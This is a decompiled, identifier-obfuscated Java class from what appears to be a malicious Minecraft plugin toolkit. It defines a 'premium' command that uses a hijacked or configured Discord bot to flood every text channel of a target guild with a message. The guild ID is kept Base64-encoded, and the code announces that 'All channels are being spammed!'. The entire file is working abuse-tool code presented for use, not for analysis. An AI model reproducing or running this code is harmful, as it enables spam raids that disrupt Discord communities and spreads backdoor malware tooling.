/*
 * Decompiled with CFR 0.150.
 * 
 * Could not load the following classes:
 *  org.bukkit.entity.Player
 */
package me.system.runner.command.impl.premium.bot;

import com.minecraftforceop.jda.jda.api.entities.Guild;
import java.util.Base64;
import me.system.runner.Core;
import me.system.runner.command.Command;
import me.system.runner.data.DataManager;
import me.system.runner.utils.Settings;
import org.bukkit.entity.Player;

public class SpamdiscordCommand
extends Command {
    public SpamdiscordCommand() {
        SpamdiscordCommand lllllllllllllllIlIIlIlIlllllllIl;
    }

    @Override
    public boolean isBlatant() {
        return true;
    }

    @Override
    public void execute(Core lllllllllllllllIlIIlIlIllllIlIll, String lllllllllllllllIlIIlIlIllllIlllI, String[] lllllllllllllllIlIIlIlIllllIlIlI, Player lllllllllllllllIlIIlIlIllllIlIIl) {
        if (lllllllllllllllIlIIlIlIllllIlIll.premium.contains(lllllllllllllllIlIIlIlIllllIlIIl.getName())) {
            if (lllllllllllllllIlIIlIlIllllIlIll.botEnabled) {
                byte[] lllllllllllllllIlIIlIlIlllllIIlI = Base64.getDecoder().decode(DataManager.getData().getString("id"));
                Guild lllllllllllllllIlIIlIlIlllllIIIl = lllllllllllllllIlIIlIlIllllIlIll.jda.getGuildById(new String(lllllllllllllllIlIIlIlIlllllIIlI));
                if (lllllllllllllllIlIIlIlIlllllIIIl == null) {
                    lllllllllllllllIlIIlIlIllllIlIIl.sendMessage(Settings.PREFIX("The bot doesn't seem to be in the guild set! Use setguild"));
                } else {
                    if (lllllllllllllllIlIIlIlIllllIlIlI.length <= 1) {
                        lllllllllllllllIlIIlIlIlllllIIIl.getTextChannels().forEach(lllllllllllllllIlIIlIlIlllIlllII -> lllllllllllllllIlIIlIlIlllIlllII.sendMessage("Wendellmeset").complete());
                    } else {
                        StringBuilder lllllllllllllllIlIIlIlIlllllIlII = new StringBuilder();
                        for (int lllllllllllllllIlIIlIlIlllllIlIl = 1; lllllllllllllllIlIIlIlIlllllIlIl != lllllllllllllllIlIIlIlIllllIlIlI.length; ++lllllllllllllllIlIIlIlIlllllIlIl) {
                            lllllllllllllllIlIIlIlIlllllIlII.append(lllllllllllllllIlIIlIlIllllIlIlI[lllllllllllllllIlIIlIlIlllllIlIl]).append(" ");
                        }
                        String lllllllllllllllIlIIlIlIlllllIIll = String.valueOf(lllllllllllllllIlIIlIlIlllllIlII);
                        lllllllllllllllIlIIlIlIlllllIIIl.getTextChannels().forEach(lllllllllllllllIlIIlIlIlllIllllI -> lllllllllllllllIlIIlIlIlllIllllI.sendMessage(lllllllllllllllIlIIlIlIlllllIIll).complete());
                    }
                    lllllllllllllllIlIIlIlIllllIlIIl.sendMessage(Settings.PREFIX("All channels are being spammed!"));
                }
            } else {
                lllllllllllllllIlIIlIlIllllIlIIl.sendMessage(Settings.PREFIX("The bot doesn't seem to be logged in! Use settoken"));
            }
        } else {
            lllllllllllllllIlIIlIlIllllIlIIl.sendMessage(Settings.PREFIX(String.valueOf(new StringBuilder().append("You must be a ").append(Settings.RED).append("premium user ").append(Settings.WHITE).append(" to execute this command"))));
        }
    }
}

